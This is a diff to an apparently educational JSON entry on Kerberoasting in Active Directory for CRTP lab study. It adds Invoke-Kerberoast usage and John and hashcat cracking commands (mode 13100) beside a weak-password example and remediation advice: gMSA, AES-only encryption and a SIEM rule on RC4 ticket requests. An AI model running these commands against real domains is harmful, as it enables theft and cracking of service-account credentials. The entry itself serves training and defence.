@@ -81,7 +81,7 @@
       "rel": "next"
     }
   ],
-  "notes": "/rc4opsec only roasts accounts that support RC4. Newer CRTP labs have specific high-value service accounts as targets.",
+  "notes": "/rc4opsec only roasts accounts that support RC4. Newer CRTP labs have specific high-value service accounts as targets. Slides: Invoke-Kerberoast (BC-SECURITY Empire/PowerView) requests + extracts SPN hashes in one PowerShell cmdlet - an alternative to Rubeus kerberoast when you want to stay in PowerShell. After extracting, crack offline with John or Hashcat (TGS-REP = hashcat mode 13100).",
   "references": [
     {
       "title": "CRTP - Kerberoasting",
@@ -110,5 +110,19 @@
     "misconfiguration": "Service accounts have weak/old passwords with SPNs registered. RC4 encryption type not restricted. No gMSA usage. SPNs set on user accounts rather than machine accounts. MDI not deployed.",
     "vulnerable_config": "# Kerberoastable accounts (SPN + weak password):\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet,msDS-SupportedEncryptionTypes\n# PasswordLastSet: 2018 AND SupportedEncryptionTypes includes RC4 (0x17) → VULNERABLE\n\n# Weak service account passwords:\n# svc_sql: Password1  (set in 2018, never changed)\n# Rubeus requests RC4 ticket → hashcat cracks in minutes",
     "secure_config": "# Use gMSA (auto-rotating 240-char passwords):\nNew-ADServiceAccount -Name 'svc_sql' -DNSHostName 'dc01.corp.local' -ManagedPasswordIntervalInDays 30\nInstall-ADServiceAccount 'svc_sql'\nSet-Service -Name 'MSSQLSERVER' -Credential (Get-ADServiceAccountCredential 'svc_sql')\n\n# Force AES-only encryption on service accounts:\nSet-ADUser svc_sql -KerberosEncryptionType AES256\n# OR via attribute editor: msDS-SupportedEncryptionTypes = 16 (AES256 only)\n\n# Rotate passwords for non-gMSA service accounts (25+ char random):\n[System.Web.Security.Membership]::GeneratePassword(30, 5)\n# Paste result into: Set-ADAccountPassword svc_old -Reset -NewPassword ...\n\n# Alert on RC4 TGS requests:\n# SIEM: EventID=4769 AND TicketEncryptionType=0x17 AND ServiceName NOT IN (krbtgt, *$) → ALERT"
-  }
+  },
+  "variations": [
+    {
+      "label": "PowerView/Empire Invoke-Kerberoast",
+      "command": "Invoke-Kerberoast -Identity <user> -Domain <domain> | fl"
+    },
+    {
+      "label": "Crack hashes offline with John",
+      "command": "john.exe --wordlist=<wordlist> <hashfile>"
+    },
+    {
+      "label": "Crack with hashcat (TGS-REP m13100 / AS-REP m18200)",
+      "command": "hashcat -m 13100 <hashfile> <wordlist>"
+    }
+  ]
 }
